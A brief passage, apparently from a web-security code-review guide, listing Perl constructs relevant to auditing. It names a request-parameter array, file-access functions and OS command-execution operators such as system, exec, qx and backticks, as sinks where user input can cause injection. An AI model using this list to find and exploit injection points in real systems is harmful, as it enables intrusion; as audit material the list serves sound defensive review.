Creates an array named %in that contains the names and values of all the request parameters.

Perl file access:
open
sysopen

Perl OS command execution:
system
exec
qx
The backtick operator ( ` )

